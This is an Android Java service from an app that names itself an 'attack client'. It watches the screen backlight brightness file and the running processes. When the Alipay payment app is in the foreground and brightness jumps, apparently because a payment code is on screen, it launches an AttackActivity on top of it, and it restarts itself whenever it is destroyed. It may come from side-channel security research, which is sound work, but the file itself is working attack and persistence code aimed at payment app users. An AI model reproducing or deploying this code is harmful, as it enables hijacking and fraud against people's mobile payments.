package com.jiacyer.attackclient.service;

import android.app.Service;
import android.content.Context;
import android.content.Intent;
import android.os.IBinder;
import android.util.Log;

import com.jaredrummler.android.processes.AndroidProcesses;
import com.jaredrummler.android.processes.models.AndroidAppProcess;
import com.jaredrummler.android.processes.models.Stat;
import com.jaredrummler.android.processes.models.Statm;
import com.jiacyer.attackclient.control.AttackActivity;
import com.jiacyer.attackclient.tools.ReadDeviceFileUtil;

import java.util.List;

/**
 *  Created by Jiacy-PC on 2018/1/23.
 */

public class DetectService extends Service {
    //    private MainHandler handler;
    private Context context;

    private static boolean runningFlag = true;
    private static boolean firstCreate = true;
    private static boolean alipayFlag = false;

    private static boolean isOnlyOne = true;
    private static boolean isSucceed = false;
    private static int brightness;

    private static Thread mThread;

    private static String lcdNodeFilePath = "/sys/class/leds/lcd_backlight0/brightness";
//    private static String tcpFile = "/proc/net/tcp";
//    private static String pidFile = "/proc/pid";

    public synchronized static void setFlag(boolean flag) {
        firstCreate = flag;
        isOnlyOne = !firstCreate;
        if (firstCreate)
            runningFlag = true;
    }

    public synchronized static boolean isOnlyOne() {
        return isOnlyOne;
    }

    public synchronized static boolean isSucceed() {
        return isSucceed;
    }

    public synchronized static int getBrightness() {
        return brightness;
    }

    @Override
    public IBinder onBind(Intent intent) {
        throw new UnsupportedOperationException("Not yet implemented");
    }

    @Override
    public void onCreate() {
        super.onCreate();
//        handler = new MainHandler();
//        isOnlyOne = false;
        context = this;
        mThread = null;
        Log.i("start", "Service start to run!");
    }

    @Override
    public int onStartCommand(final Intent intent, int flags, final int startId) {
        Log.i("Service", "start!");
        Log.i("Service", "onStartCommand()");
//        Notification.Builder builder = new Notification.Builder(this.getApplicationContext()); //获取一个Notification构造器
//        Intent nfIntent = new Intent(this, MainActivity.class);
//
//        builder.setContentIntent(PendingIntent.getActivity(this, 0, nfIntent, 0)) // 设置PendingIntent
//        .setContentTitle("攻击端") // 设置下拉列表里的标题
//        .setSmallIcon(R.mipmap.ic_launcher) // 设置状态栏内的小图标
//        .setContentText("点击唤出停止界面") // 设置上下文内容
//        .setWhen(System.currentTimeMillis()); // 设置该通知发生的时间
//
//        Notification notification = builder.build(); // 获取构建好的Notification
////        notification.defaults = Notification.DEFAULT_SOUND; //设置为默认的声音
//        startForeground(110, notification);// 开始前台服务

        if (mThread == null)
            mThread = new Thread() {
                @Override
                public void run() {
                    Log.i("Thread", "thread-run");
                    while (runningFlag) {
                        try {
                            String ret = ReadDeviceFileUtil.readFile(lcdNodeFilePath);
                            int i = Integer.parseInt(ret);
//                        ret = ReadDeviceFileUtil.readFile(tcpFile);

                            List<AndroidAppProcess> processes = AndroidProcesses.getRunningAppProcesses();

                            alipayFlag = false;
                            for (AndroidAppProcess process : processes) {
                                // Get some information about the process
                                String processName = process.name;

                                if (processName.contains("com.eg.android.AlipayGphone") && process.foreground) {
//                                if (processName.contains("com.jiacyer.newpaydemo") && process.foreground) {
                                    alipayFlag = true;

                                    Stat stat = process.stat();
                                    int pid = stat.getPid();
                                    int parentProcessId = stat.ppid();
                                    long startTime = stat.stime();
                                    int policy = stat.policy();
                                    char state = stat.state();

                                    Statm statm = process.statm();
                                    long totalSizeOfProcess = statm.getSize();
                                    long residentSetSize = statm.getResidentSetSize();

//                            PackageInfo packageInfo = process.getPackageInfo(context, 0);
//                            String appName = packageInfo.applicationInfo.loadLabel(pm).toString();
                                    Log.i("ProcessInfo", "ProcessName:" + processName + "--Pid:" + pid +
                                            "--parentProcessID:" + parentProcessId + "--startTime:" + startTime +
                                            "--policy:" + policy + "--state:" + state + "--totalSiOfProcess:" +
                                            totalSizeOfProcess + "--residentSetSize:" + residentSetSize);
                                }
                            }

                            if (i > 190 && alipayFlag) {
                                Log.i("Detecting", "higher than definition!");
                                isSucceed = true;
                                brightness = i;

                                if (firstCreate) {
                                    Intent intent = new Intent(DetectService.this, AttackActivity.class);
                                    intent.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK | Intent.FLAG_ACTIVITY_CLEAR_TOP);
                                    startActivity(intent);
                                    firstCreate = false;

//                                Message msg = new Message();
//                                msg.what = MainHandler.TRUE;
//                                handler.sendMessage(msg);
                                }
                            } else {
                                Log.i("Detecting", "lower than definition!");
                                isSucceed = false;
//                            Message msg = new Message();
//                            msg.what = MainHandler.FALSE;
//                            handler.sendMessage(msg);
                                firstCreate = true;
                            }

                            synchronized (this) {
                                Thread.sleep(3000);
                            }
                        } catch (Exception e) {
                            e.printStackTrace();
                        }
                    }
                }
            };

        if (runningFlag && !mThread.isAlive())
            mThread.start();

        flags = START_STICKY;
        return super.onStartCommand(intent, flags, startId);
    }

    @Override
    public void onDestroy() {
        super.onDestroy();
        Log.d("stop", "Service is stopped!");
        runningFlag = false;

        Intent intent = new Intent();
        intent.setClass(this, DetectService.class);
        this.startService(intent);
    }

}
